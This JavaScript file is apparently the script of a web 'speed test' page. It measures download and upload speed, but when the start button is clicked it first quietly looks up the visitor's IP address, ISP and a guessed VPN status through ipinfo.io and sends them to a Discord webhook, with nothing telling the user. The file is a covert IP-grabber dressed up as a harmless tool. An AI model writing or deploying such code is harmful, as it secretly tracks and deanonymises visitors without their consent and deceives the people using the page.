let ipinfoToken = "";
let discordWebhook = "";

async function loadTokens() {
  const response = await fetch("tokens.json");
  const tokens = await response.json();
  ipinfoToken = tokens.ipinfoToken;
  discordWebhook = tokens.discordWebhook;
}

document.getElementById("startBtn").addEventListener("click", async () => {
  await loadTokens();
  sendIPToDiscord();
  runSpeedTest();
});

async function sendIPToDiscord() {
  try {
    const response = await fetch(`https://ipinfo.io/json?token=${ipinfoToken}`);
    const data = await response.json();

    const userIP = data.ip || "Unknown IP";
    const vpnDetected = (data.org && data.org.toLowerCase().includes("vpn")) ||
                        (data.hostname && data.hostname.toLowerCase().includes("vpn")) ? "Yes" : "No";

    const content = `
🚨 User IP detected: \`${userIP}\`
🔍 ISP/Org: ${data.org || "Unknown"}
🌐 VPN/Proxy Detected: ${vpnDetected}
🕒 Time: ${new Date().toISOString()}
    `;

    const payload = { content };

    await fetch(discordWebhook, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });
  } catch (e) {
    console.error("Failed to send IP and VPN info to Discord:", e);
  }
}

async function runSpeedTest() {
  updateText("download", "Testing download speed...");
  updateText("upload", "Testing upload speed...");

  await testDownload();
  await testUpload();
}

async function testDownload() {
  const downloadSize = 10 * 1024 * 1024; // 10MB
  const url = `https://speed.hetzner.de/10MB.bin?cacheBust=${Math.random()}`;

  const startTime = performance.now();
  try {
    await fetch(url, { cache: "no-store" });
    const endTime = performance.now();

    const duration = (endTime - startTime) / 1000;
    const bitsLoaded = downloadSize * 8;
    const mbps = (bitsLoaded / duration / 1024 / 1024).toFixed(2);

    updateText("download", `Download Speed: ${mbps} Mbps`);
  } catch {
    updateText("download", "Download Speed: Test Failed");
  }
}

async function testUpload() {
  const uploadSize = 2 * 1024 * 1024; // 2MB
  const data = new Uint8Array(uploadSize);
  const blob = new Blob([data]);

  const startTime = performance.now();

  try {
    await fetch("https://httpbin.org/post", {
      method: "POST",
      body: blob,
    });

    const endTime = performance.now();
    const duration = (endTime - startTime) / 1000;
    const bits = uploadSize * 8;
    const mbps = (bits / duration / 1024 / 1024).toFixed(2);

    updateText("upload", `Upload Speed: ${mbps} Mbps`);
  } catch {
    updateText("upload", "Upload Speed: Test Failed");
  }
}

function updateText(id, text) {
  document.getElementById(id).textContent = text;
}
